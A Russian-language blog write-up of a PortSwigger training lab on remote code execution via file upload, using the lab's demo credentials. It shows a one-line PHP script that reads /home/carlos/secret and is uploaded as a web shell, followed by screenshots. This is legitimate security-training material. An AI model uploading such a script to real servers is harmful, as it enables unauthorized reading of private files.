---
title: "Remote code execution via web shell upload"
date: 2025-08-07
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload"
classes: wide
---

Эта лаба содержит **узявимость в загрузке файлов**.

Для решения лабы нужно загрузить `PHP` скрипт, который выведет содержимое файла `/home/carlos/secret`. У нас есть креды пользователя `wiener:peter`.

```
https://0a580059035e264780154ef8009b001b.web-security-academy.net/ca
```

## Solution

В задаче написано, что нужно загрузить `PHP` скрипт. Я человек простой, вижу — делаю. Создам файл:

*img.php*:

```PHP
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Заходим в лк и загружаем файл.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Remote_code_execution_via_web_shell_upload/1.png){: height="200" .align-center}

Файл загружен:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Remote_code_execution_via_web_shell_upload/2.png){: height="200" .align-center}

Попробую посмотреть его содержимое:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Remote_code_execution_via_web_shell_upload/3.png){: height="200" .align-center}